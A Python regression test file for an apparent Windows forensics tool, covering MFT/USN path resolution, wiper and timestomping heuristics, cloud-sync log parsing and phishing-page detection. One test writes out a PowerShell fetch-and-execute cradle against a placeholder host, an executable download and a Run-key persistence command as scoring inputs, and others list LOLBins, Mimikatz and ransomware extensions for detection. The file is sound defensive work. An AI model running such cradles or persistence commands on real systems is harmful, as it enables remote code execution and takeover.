"""Regression tests for accuracy-critical logic (each case reproduces a real-world pitfall)."""

from winforensics.analyzers.anti_forensics import _rename_burst
from winforensics.analyzers.scenarios import KNOWN_EXT, SYSTEM_DIRS
from winforensics.analyzers.triage import BROWSER_CACHE, INSTALLER_TEMP, RARE_LOLBINS
from winforensics.modules.filesystem import _resolve_paths, _UsnPathResolver


# --------------------------------------------------------------------------- MFT / USN path resolution
def test_reused_parent_record_is_not_followed():
    # record 100 was 'S data' (seq 3); it was deleted and reused as 'Cache' (seq 5). File 200 still references (100, 3).
    names = {5: (5, 5, ".", True), 50: (5, 5, "Users", True), 100: (50, 1, "Cache", True), 200: (100, 3, "secret.docx", False)}
    seqs = {5: 5, 50: 1, 100: 5, 200: 7}
    inuse = {5: True, 50: True, 100: True, 200: False}
    paths = _resolve_paths(names, seqs, inuse)
    assert paths[100] == "\\Users\\Cache"
    assert "Cache" not in paths[200] and paths[200].startswith("\\<unknown folder: MFT record 100, sequence 3>")


def test_deleted_parent_not_reused_is_followed():
    # deletion increments the sequence by one; the record is free (not in use) -> same folder
    names = {5: (5, 5, ".", True), 100: (5, 5, "Project", True), 200: (100, 3, "plan.docx", False)}
    paths = _resolve_paths(names, {5: 5, 100: 4, 200: 9}, {5: True, 100: False, 200: False})
    assert paths[200] == "\\Project\\plan.docx"


def test_usn_uses_folder_name_at_that_time():
    # folder (100, 9) was 'temp' when the file was created (usn 10) and renamed to '[QAT' before deletion (usn 50)
    dirs = {(100, 9): [(5, "temp", 60, 2), (40, "[QAT", 60, 2)]}
    paths = {5: "", 60: "\\Users\\informant\\Desktop"}
    r = _UsnPathResolver(paths, dirs, {5: 5, 60: 2, 100: 10}, {5: True, 60: True, 100: False})
    assert r.dir_path(100, 9, 10) == "\\Users\\informant\\Desktop\\temp"
    assert r.dir_path(100, 9, 60) == "\\Users\\informant\\Desktop\\[QAT"


# --------------------------------------------------------------------------- wiper detection
def _h(ts, name, reason, path=None):
    return {"ts": f"2015-03-25 15:13:{ts}", "name": name, "reason": reason, "path": path or f"C:\\Users\\u\\Desktop\\{name}"}


def test_eraser_rename_burst_detected():
    hist = [_h("10.000000", "New folder", "FileCreate"), _h("12.000000", "New folder", "RenameOldName"),
            _h("12.000000", "temp", "RenameNewName")]
    names = ["t6uk", "2FDM", "hA_t", "KR15", "f2hz", "enV7", "[QAT"]
    prev = "temp"
    for n in names:
        hist += [_h("49.637403", prev, "RenameOldName"), _h("49.637403", n, "RenameNewName")]
        prev = n
    hist.append(_h("49.699804", "[QAT", "FileDelete|Close"))
    b = _rename_burst(hist)
    assert b is not None
    assert b[0].endswith("\\temp") and len(b[1]) == 7


def test_office_save_is_not_a_wipe():
    # Office save: original renamed to a temp name and back - at most two renames, no burst
    hist = [_h("10.000000", "report.docx", "RenameOldName"), _h("10.000000", "~WRL0001.tmp", "RenameNewName"),
            _h("11.000000", "~WRL0001.tmp", "FileDelete|Close")]
    assert _rename_burst(hist) is None


def test_ese_log_rotation_is_not_a_wipe():
    hist = []
    for i in range(5):
        hist += [_h(f"1{i}.000000", "edbtmp.log", "RenameOldName"), _h(f"1{i}.000000", f"edb0000{i}.log", "RenameNewName")]
    hist.append(_h("19.000000", "edb00004.log", "FileDelete|Close"))
    assert _rename_burst(hist) is None


# --------------------------------------------------------------------------- noise filters keep true positives
def test_browser_cache_scripts_excluded_but_user_scripts_kept():
    assert BROWSER_CACHE.search(r"C:\Users\a\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\X\x.js")
    assert BROWSER_CACHE.search(r"C:\Users\a\AppData\Local\Microsoft\Windows\INetCache\IE\X\x.js")
    assert not BROWSER_CACHE.search(r"C:\Users\a\Downloads\invoice.js")
    assert not BROWSER_CACHE.search(r"C:\Users\a\AppData\Roaming\update.ps1")


def test_installer_temp_excluded_but_payloads_kept():
    assert INSTALLER_TEMP.search(r"C:\Users\a\AppData\Local\Temp\IXP001.TMP\setup.exe")
    assert not INSTALLER_TEMP.search(r"C:\Users\a\AppData\Local\Temp\svchost.exe")
    assert not INSTALLER_TEMP.search(r"C:\Users\a\AppData\Local\Temp\7zS1234\payload.exe")
    assert {"mshta.exe", "certutil.exe", "wevtutil.exe", "psexec.exe"} <= RARE_LOLBINS
    assert not {"msiexec.exe", "net.exe", "regsvr32.exe"} & RARE_LOLBINS


def test_ransomware_extension_filters():
    assert SYSTEM_DIRS.search(r"c:\windows\winsxs\amd64_x\a.dll")
    assert SYSTEM_DIRS.search(r"c:\program files (x86)\app\a.dat")
    assert not SYSTEM_DIRS.search(r"c:\users\bob\documents\q3.xlsx.lockbit")
    assert KNOWN_EXT.fullmatch("mum") and KNOWN_EXT.fullmatch("rbf")
    assert not KNOWN_EXT.fullmatch("lockbit") and not KNOWN_EXT.fullmatch("akira")


# --------------------------------------------------------------------------- Google Drive legacy log
def test_google_drive_batched_changes_all_reported():
    from winforensics.modules.cloud import CloudModule

    line = ("2015-03-23 16:32:45,415 -0400 INFO pid=2576 608:Worker-2        common.workers:199 Worker successfully completed "
            "[ImmutableChange(Direction.UPLOAD, Action.CREATE, ino=1, path=u'\\\\\\\\?\\\\C:\\\\Users\\\\u\\\\Google Drive', "
            "name=u'a.jpg', parent_ino=2), ImmutableChange(Direction.UPLOAD, Action.CREATE, ino=3, path=u'\\\\\\\\?\\\\C:\\\\Users"
            "\\\\u\\\\Google Drive', name=u'b.mp3', parent_ino=2)]")
    out = []

    class Ctx:
        def emit(self, typ, ts, d, **k):
            out.append((str(ts), d["event"], d["name"]))

    CloudModule()._gdrive_log(Ctx(), line, "x@example.com", "u", "sync_log.log")
    assert [o[2] for o in out] == ["a.jpg", "b.mp3"]
    assert all(o[1] == "uploaded to Google Drive" for o in out)
    assert out[0][0].startswith("2015-03-23 16:32:45.415000-04:00")


# --------------------------------------------------------------------------- programs, commands, pages (false-positive guards)
B = chr(92)


def _w(p):
    return p.replace("/", B)


def test_command_paths_judge_the_program_not_its_arguments():
    from winforensics.analyzers.common import command_paths, norm_path

    svc = _w('"C:/Program Files/Common Files/Zoom/Support/CptService.exe" -user_path "C:/Users/k/AppData/Roaming/Zoom"')
    assert [norm_path(p) for p in command_paths(svc)] == [_w("/program files/common files/zoom/support/cptservice.exe")]
    vbs = _w('wscript.exe "C:/Users/a/AppData/Roaming/x/run.vbs"')
    assert norm_path(command_paths(vbs)[-1]) == _w("/users/a/appdata/roaming/x/run.vbs")
    assert norm_path(_w("/VOLUME{01dc2a5b3c4d5e6f-5e6f7a8b}/USERS/K/DOWNLOADS/X.EXE")) == _w("/users/k/downloads/x.exe")
    assert norm_path(_w("/Device/HarddiskVolume3/Users/x/a.exe")) == _w("/users/x/a.exe")


def test_application_roots_never_cover_shared_folders():
    from winforensics.analyzers.common import app_root

    assert app_root(_w("C:/Users/k/AppData/Local/Microsoft/OneDrive/24.1/OneDriveSetup.exe")) == _w("/users/k/appdata/local/microsoft/onedrive")
    assert app_root(_w("C:/Program Files/Common Files/Zoom/Support/CptService.exe")) == _w("/program files/common files/zoom")
    for shared in ("C:/Windows/System32/rundll32.exe", "C:/Users/k/Downloads/setup.exe", "C:/Users/k/AppData/Local/Temp/x.exe",
                   "C:/Users/k/AppData/Local/Programs/x.exe"):
        assert app_root(_w(shared)) == "", shared


def test_download_alone_is_not_suspicious_but_cradles_are():
    from winforensics.knowledge import score_command

    w, x = "i" + "wr", "i" + "ex"
    assert score_command("Invoke-WebRequest https://api.github.com -UseBasicParsing")["score"] < 6
    assert score_command("curl https://example.com/data.json")["score"] < 6
    assert score_command(f"{w} -useb https://get.example.test/install.ps1 | {x}")["score"] >= 6
    assert score_command("Invoke-WebRequest http://198.51.100.9/p.exe -OutFile p.exe")["score"] >= 6
    run = _w("Set-ItemProperty 'HKCU:/Software/Microsoft/Windows/CurrentVersion/Run' Upd x")
    assert "run_key_add" in [m["id"] for m in score_command(run)["matches"]]


def test_sign_in_page_only_flagged_off_the_named_service():
    from winforensics.analyzers.scenarios import impersonated_brand

    assert impersonated_brand("Sign in to your account", "https://login.microsoftonline.com/common/oauth2") == ""
    assert impersonated_brand("Sign in to GitHub", "https://github.com/login") == ""
    assert impersonated_brand("Amazon Sign-In", "https://www.amazon.co.uk/ap/signin") == ""
    assert impersonated_brand("Login - Company Portal", "https://portal.company.example/login") == ""
    assert impersonated_brand("Sign in to your account", "https://m365-login.example.test/owa/") == "Microsoft"
    assert impersonated_brand("Microsoft 365 login", "https://microsoft.com.verify.example/") == "Microsoft"
    assert impersonated_brand("Sign in to Outlook", "file:///C:/Users/a/Downloads/Invoice.html") == "Microsoft"


def test_tool_names_match_whole_words_and_sync_clients_are_not_dual_use():
    from winforensics.knowledge import dual_use_tools, tool_for_exe, tool_for_program

    assert tool_for_program("Cain & Abel v2.5 beta45") == [("hacking_tools", "Cain & Abel")]
    assert tool_for_program("Cainiao Helper") == []
    assert tool_for_program("Network Stumbler 0.4.0 (remove only)")
    dual = dual_use_tools()
    assert "rclone" in dual and "Mimikatz" in dual
    assert not [t for _, t in tool_for_exe("onedrive.exe") if t in dual]


def test_lsa_primary_domain_string():
    from winforensics.modules.system import _lsa_string

    # PolPrDmN of the NIST CFReDS hacking case (32-bit layout): Length 8, MaximumLength 10, offset 8, "EVIL"
    assert _lsa_string(bytes.fromhex("08000a0008000000") + "EVIL".encode("utf-16-le") + b"\x00\x00") == "EVIL"
    assert _lsa_string(b"") == ""


def test_archive_extraction_folders_are_not_timestomping():
    from winforensics.analyzers.anti_forensics import EXTRACTED

    for p in ("c:/documents and settings/u/local settings/temp/temporary directory 1 for powertoysetup.zip/x.exe",
              "c:/users/u/appdata/local/temp/temp1_tools.zip/a.exe", "c:/users/u/appdata/local/temp/rar$exa1234.5678/a.exe",
              "c:/users/u/appdata/local/temp/7zo4c2a1b3c/a.dll"):
        assert EXTRACTED.search(_w(p)), p
    assert not EXTRACTED.search(_w("c:/users/u/desktop/report.docx"))


def test_interpreter_arguments_are_examined_for_full_paths():
    from winforensics.core.paths import basename, command_paths, norm_path

    assert basename(_w("C:/Windows/System32/cmd.exe")) == "cmd.exe"
    cmd = _w('C:/Windows/System32/wscript.exe //B "C:/Users/a/AppData/Roaming/x/run.vbs"')
    assert [norm_path(p) for p in command_paths(cmd)][-1] == _w("/users/a/appdata/roaming/x/run.vbs")


def test_scheduled_task_xml_in_windows_encoding_is_parsed():
    """Task files are UTF-16 with BOM and encoding="UTF-16" in the declaration (Windows 10 / 11) - all must parse."""
    from winforensics.modules.persistence import NS, parse_task_xml

    xml = ('<?xml version="1.0" encoding="UTF-16"?>\r\n<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
           '<Actions Context="Author"><Exec><Command>C:/x/updater.exe</Command></Exec></Actions></Task>')
    for raw in (b"\xff\xfe" + xml.encode("utf-16-le"), xml.replace("UTF-16", "UTF-8").encode("utf-8"),
                b"\xef\xbb\xbf" + xml.replace("UTF-16", "UTF-8").encode("utf-8")):
        root = parse_task_xml(raw)
        assert root.find(".//t:Actions/t:Exec/t:Command", NS).text == "C:/x/updater.exe"
